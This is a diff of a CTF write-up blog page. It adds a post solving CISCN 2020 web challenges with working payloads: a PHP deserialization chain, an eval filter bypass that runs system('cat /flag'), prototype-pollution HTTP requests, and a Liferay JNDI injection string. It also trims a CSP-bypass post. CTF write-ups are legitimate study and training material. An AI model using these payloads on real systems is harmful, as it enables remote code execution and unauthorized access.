@@ -71,6 +71,83 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-ciscn2020预选赛" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/08/20/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/" class="article-date">
+  <time class="dt-published" datetime="2020-08-20T16:00:00.000Z" itemprop="datePublished">2020-08-21</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/08/20/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/">ciscn2020预选赛</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="ciscn-2020-预选赛"><a href="#ciscn-2020-预选赛" class="headerlink" title="ciscn 2020 预选赛"></a>ciscn 2020 预选赛</h1><h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p>和wmctf2020的webwebpayload相同</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Cursor</span>  <span class="title">implements</span> \<span class="title">IteratorAggregate</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span> <span class="title">extends</span> \<span class="title">DB</span>\<span class="title">Cursor</span>&#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">props</span>=[&quot;<span class="title">quotekey</span>&quot;=&gt;&quot;<span class="title">phpinfo</span>&quot;],</span><br><span class="line">            $<span class="title">adhoc</span>=[-1=&gt;[&quot;<span class="title">expr</span>&quot;=&gt;&quot;&quot;]],</span><br><span class="line">            $<span class="title">db</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span>(<span class="params"><span class="variable">$offset</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params"><span class="variable">$offset</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span>(<span class="params"><span class="variable">$offset</span>, <span class="variable">$value</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span>(<span class="params"><span class="variable">$offset</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="variable">$val</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Agent</span> &#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">server</span>=&quot;&quot;;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events=[<span class="string">&quot;disconnect&quot;</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="string">&quot;&quot;</span>)),<span class="string">&quot;find&quot;</span>)];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server=&amp;<span class="keyword">$this</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">array</span>(<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">WS</span>(),<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">Agent</span>())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>阅读代码我们发现:<code>if(!pcntl_wifexited($status))&#123;phpinfo();&#125;</code>，及fork的子进程报错就会执行phpinfo，而phpinfo里面通常包含敏感信息，和一些对我们题目有帮助的信息。</p>
+<p>fork子进程执行的代码是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;is_string(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!preg_match(<span class="string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">            call_user_func_array(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],[<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="literal">false</span>,<span class="literal">true</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>而这里调用了非常敏感的call_user_func_array，所以无论是想让子进程报错还是直接执行代码这里都是非常好的选择。因此我们先要写个fuzz脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$payloads</span>=[</span><br><span class="line">        <span class="string">&quot;ls&quot;</span>,<span class="comment">//shell命令执行测试</span></span><br><span class="line">        <span class="string">&quot;index.php&quot;</span>,<span class="comment">//读取文件测试</span></span><br><span class="line">        <span class="string">&quot;asdfasldfjaklsdfjl.php&quot;</span>,<span class="comment">//创建文件/文件夹测试</span></span><br><span class="line">        <span class="string">&quot;echo 123;&quot;</span><span class="comment">//php命令执行测试</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="variable">$str</span>=file_get_contents(<span class="string">&quot;fatalerr.log&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$str</span>)&#123;</span><br><span class="line">        <span class="variable">$str</span>=<span class="string">&quot;[]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$fatalerror</span>=<span class="keyword">eval</span>(<span class="string">&quot;return &quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_result</span>(<span class="params"><span class="variable">$func</span>,<span class="variable">$r</span>,<span class="variable">$v</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$r</span>==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$func</span>(<span class="subst">$v</span>,false,true) return value:&quot;</span>;</span><br><span class="line">            var_dump(<span class="variable">$r</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">brute_func</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$payloads</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$fatalerror</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$val</span>)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(is_array(<span class="variable">$val</span>))&#123;</span><br><span class="line">                brute_func(<span class="variable">$val</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(in_array(<span class="variable">$val</span>,<span class="variable">$fatalerror</span>))&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            array_push(<span class="variable">$fatalerror</span>,<span class="variable">$val</span>);</span><br><span class="line">            file_put_contents(<span class="string">&quot;fatalerr.log&quot;</span>,var_export(<span class="variable">$fatalerror</span>,<span class="literal">TRUE</span>));</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$payloads</span> <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">                <span class="variable">$r</span>=<span class="literal">NULL</span>;</span><br><span class="line">                </span><br><span class="line">                <span class="variable">$r</span>=call_user_func_array(<span class="variable">$val</span>,[<span class="variable">$v</span>,<span class="literal">false</span>,<span class="literal">true</span>]);</span><br><span class="line">                show_result(<span class="variable">$val</span>,<span class="variable">$r</span>,<span class="variable">$v</span>);</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            array_pop(<span class="variable">$fatalerror</span>);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable">$arr</span>=get_defined_functions();</span><br><span class="line">    brute_func(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>多次执行发现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stream_socket_server</span><br><span class="line">exec</span><br><span class="line">stream_socket_client</span><br></pre></td></tr></table></figure>
+
+<p>这三个函数会引起segment_fault 且 exec虽然会引起segment  fault但是仍然执行了代码</p>
+<p>但是这里只需要segment_fault,所以访问<code>?a=stream_socket_server&amp;b=</code>拿到flag</p>
+<h2 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h2><p>注意到有个eval只要绕过限制就可以执行命令了</p>
+<p>很简单利用字符串拼接绕过</p>
+<p><code>&#123;if:+(&#39;base64_deco&#39;.&#39;d&#39;.&#39;e&#39;)(&#39;c3lzdGVt&#39;)(&#39;cat+/flag&#39;)&#125;&#123;end+if&#125;</code></p>
+<h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h2><p>队里的师傅做出来的,dbq，我太菜了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$trick2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> trick;</span><br><span class="line"><span class="variable">$t</span>-&gt;trick1 = <span class="string">&quot;INF&quot;</span>;</span><br><span class="line"><span class="variable">$t</span>-&gt;trick2 = <span class="number">1e1111</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$t</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">λ npm audit</span><br><span class="line"></span><br><span class="line">                       === npm audit security report ===</span><br><span class="line"></span><br><span class="line"># Run  npm update set-value --depth 1  to resolve 1 vulnerability</span><br><span class="line"></span><br><span class="line">  High            Prototype Pollution</span><br><span class="line"></span><br><span class="line">  Package         set-value</span><br><span class="line"></span><br><span class="line">  Dependency of   set-value</span><br><span class="line"></span><br><span class="line">  Path            set-value</span><br><span class="line"></span><br><span class="line">  More info       https://npmjs.com/advisories/1012</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">found 1 high severity vulnerability in 61 scanned packages</span><br><span class="line">  run `npm audit fix` to fix 1 of them.</span><br></pre></td></tr></table></figure>
+
+<p>原型链污染，poc地址：<br><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213">https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</a></p>
+<ul>
+<li>先访问一次<code>/SpawnPoint</code>，拿个sessionid</li>
+<li>然后访问<code>/Privilege</code>污染原型链（用<code>constructor.prototype</code>或者<code>__proto__</code>均可）</li>
+<li>最后访问<code>/DeveloperControlPanel</code>拿flag</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /Privilege HTTP/1.1</span><br><span class="line">Host: host</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: session=yoursession</span><br><span class="line"></span><br><span class="line">NewAttributeValue=abc&amp;NewAttributeKey=__proto__.password4</span><br><span class="line"></span><br><span class="line">POST /DeveloperControlPanel HTTP/1.1</span><br><span class="line">Host: host</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: session=yoursession</span><br><span class="line"></span><br><span class="line">key=password4&amp;password=abc</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://site.ccreater.top/2020/08/20/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/" data-id="cku8ky2y3003odnnfetl8gj5d" data-title="ciscn2020预选赛" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-wmctf2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/08/03/wmctf2020/" class="article-date">
@@ -185,7 +262,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/08/03/wmctf2020/" data-id="cku8k8fz0006ud0obctgv9f27" data-title="wmctf2020" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/08/03/wmctf2020/" data-id="cku8ky2zi006udnnf6ijm87d9" data-title="wmctf2020" class="article-share-link">Share</a>
       
       
       
@@ -273,7 +350,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/07/28/CyBRICS2020/" data-id="cku8k8fws001ed0ob678m2wth" data-title="CyBRICS2020" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/07/28/CyBRICS2020/" data-id="cku8ky2x2001ednnf9u8hfgnu" data-title="CyBRICS2020" class="article-share-link">Share</a>
       
       
       
@@ -341,7 +418,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/07/18/geekpwn2020/" data-id="cku8k8fxx004ed0obb8kqb3bs" data-title="geekpwn2020" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/07/18/geekpwn2020/" data-id="cku8ky2yf004ednnfg7rt4i5b" data-title="geekpwn2020" class="article-share-link">Share</a>
       
       
       
@@ -422,7 +499,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/07/08/bypass%20CORS/" data-id="cku8k8fxi0037d0obgxwabu8r" data-title="bypass CORS" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/07/08/bypass%20CORS/" data-id="cku8ky2xx0037dnnf5o0j0wxe" data-title="bypass CORS" class="article-share-link">Share</a>
       
       
       
@@ -587,7 +664,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/07/07/sctf2020/" data-id="cku8k8fyq0062d0ob0e72h479" data-title="sctf2020" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/07/07/sctf2020/" data-id="cku8ky2z80062dnnfbx2j1niv" data-title="sctf2020" class="article-share-link">Share</a>
       
       
       
@@ -860,7 +937,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/06/29/bypass_disable_function_open_basedir/" data-id="cku8k8fxk003ed0obcbw42qmp" data-title="bypass_disable_function_open_basedir" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/06/29/bypass_disable_function_open_basedir/" data-id="cku8ky2xz003ednnf2wfzah5w" data-title="bypass_disable_function_open_basedir" class="article-share-link">Share</a>
       
       
       
@@ -995,7 +1072,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/06/29/tctf2020/" data-id="cku8k8fyr0066d0obazqahzli" data-title="tctf2020" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/06/29/tctf2020/" data-id="cku8ky2z90066dnnfcb7i3rf1" data-title="tctf2020" class="article-share-link">Share</a>
       
       
       
@@ -1040,7 +1117,7 @@
 
 <p>根据issue<a target="_blank" rel="noopener" href="https://github.com/golang/go/issues/29098">https://github.com/golang/go/issues/29098</a> 绕过</p>
 <p><code>http://root:P@ssw0rd!@127.0.0.1]&#39;Pwned!&#39;]:80/flag.php#</code></p>
-<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p><a href="mailto:&#99;&#x63;&#114;&#101;&#x61;&#116;&#x65;&#x72;&#x40;&#49;&#54;&#51;&#x2e;&#99;&#x6f;&#109;">&#99;&#x63;&#114;&#101;&#x61;&#116;&#x65;&#x72;&#x40;&#49;&#54;&#51;&#x2e;&#99;&#x6f;&#109;</a>  E6N0HT aa05940594</p>
+<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p><a href="mailto:&#99;&#99;&#114;&#x65;&#97;&#x74;&#x65;&#114;&#64;&#x31;&#54;&#x33;&#x2e;&#x63;&#111;&#109;">&#99;&#99;&#114;&#x65;&#97;&#x74;&#x65;&#114;&#64;&#x31;&#54;&#x33;&#x2e;&#x63;&#111;&#109;</a>  E6N0HT aa05940594</p>
 <p>cmd={“/expandocolumn/add-column”:{}}&amp;p_auth=Gyr2NhlX&amp;formDate=1585307550388&amp;tableId=1&amp;name=1&amp;type=1&amp;+defaultData:com.mchange.v2.c3p0.JndiRefForwardingDataSource={“jndiName”:”ldap://127.0.0.1:1389/Object”,”loginTimeout”:0}</p>
 <h2 id="白盒拟态路由"><a href="#白盒拟态路由" class="headerlink" title="白盒拟态路由"></a>白盒拟态路由</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vtysh</span><br><span class="line">conf t</span><br><span class="line">ip route 200.14.1.0/24 x.x.x.x</span><br></pre></td></tr></table></figure>
 
@@ -1053,7 +1130,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/06/22/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/" data-id="cku8k8fz7007nd0ob1s3y55f0" data-title="拟态防御记录" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/06/22/%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E8%AE%B0%E5%BD%95/" data-id="cku8ky2zs007ndnnfduzv35o7" data-title="拟态防御记录" class="article-share-link">Share</a>
       
       
       
@@ -1164,130 +1241,12 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/05/23/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/" data-id="cku8k8fwi000nd0obb1exh4ph" data-title="2020第三届BJDCTF" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/05/23/2020%E7%AC%AC%E4%B8%89%E5%B1%8ABJDCTF/" data-id="cku8ky2wq000ndnnf1nts7l2n" data-title="2020第三届BJDCTF" class="article-share-link">Share</a>
       
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
 
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-bypass_csp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/05/19/bypass_csp/" class="article-date">
-  <time class="dt-published" datetime="2020-05-19T16:00:00.000Z" itemprop="datePublished">2020-05-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/web/">web</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/05/19/bypass_csp/">bypass_csp</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="bypass-csp"><a href="#bypass-csp" class="headerlink" title="bypass csp"></a>bypass csp</h1><p>内容安全策略  (<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/CSP">CSP</a>) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Glossary/XSS">XSS</a>) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段。 </p>
-<h2 id="csp语法"><a href="#csp语法" class="headerlink" title="csp语法"></a>csp语法</h2><p>CSP的特点就是他是在浏览器层面做的防护，是和同源策略同一级别，除非浏览器本身出现漏洞，否则不可能从机制上绕过。</p>
-<p>CSP只允许被认可的JS块、JS文件、CSS等解析，只允许向指定的域发起请求。</p>
-<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</a></p>
-<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy</a></p>
-<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src"><code>default-src</code></a> :在其他资源类型没有符合自己的策略时应用该策略(有关完整列表查看<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src"><code>default-src</code></a> )</p>
-<p><img src="https://images.seebug.org/content/images/2017/10/7b7e1d4c-9d9a-4bd0-ae6d-f266871fa300.png-w331s" alt="image773"></p>
-<p><img src="https://images.seebug.org/content/images/2017/10/c5a45eca-7e0c-4ebf-8143-712e4594f2fd.png-w331s" alt="image878"></p>
-<h3 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h3><p><code>script-src &#39;nonce-r4nd0m&#39; &#39;strict-dynamic&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;; </code></p>
-<p>script-src 中 strict-dynamic 中的作用:</p>
-<ul>
-<li>丢弃白名单</li>
-<li>允许执行js生成的js代码，例如：document.createElement(‘script’) </li>
-<li>使  nonce-only CSPs  可以工作</li>
-</ul>
-<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200520164256.png" alt="image1216"></p>
-<h3 id="一些注意点"><a href="#一些注意点" class="headerlink" title="一些注意点"></a>一些注意点</h3><p><code>https://cdn.com/*</code>只能匹配<code>https://cdn.com/*</code></p>
-<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="csp策略不完全导致的绕过"><a href="#csp策略不完全导致的绕过" class="headerlink" title="csp策略不完全导致的绕过"></a>csp策略不完全导致的绕过</h3><h3 id="利用302跳转"><a href="#利用302跳转" class="headerlink" title="利用302跳转"></a>利用302跳转</h3><p><code> Content-Security-Policy: default-src &#39;self &#39;; script-src http://127.0.0.1/static/</code></p>
-<p>如果可信域内存在一个可控的重定向文件，那么CSP的目录限制就可以被绕过。 </p>
-<p>假设static目录下存在一个302文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Static/302.php</span><br><span class="line"></span><br><span class="line">&lt;?php Header(&quot;location: &quot;.$_GET[&#x27;url&#x27;])?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>像刚才一样，上传一个test.jpg 然后通过302.php跳转到upload目录加载js就可以成功执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;static/302.php?url=upload/test.jpg&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="绕过域限制的一些tricks"><a href="#绕过域限制的一些tricks" class="headerlink" title="绕过域限制的一些tricks"></a>绕过域限制的一些tricks</h3><p><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code></p>
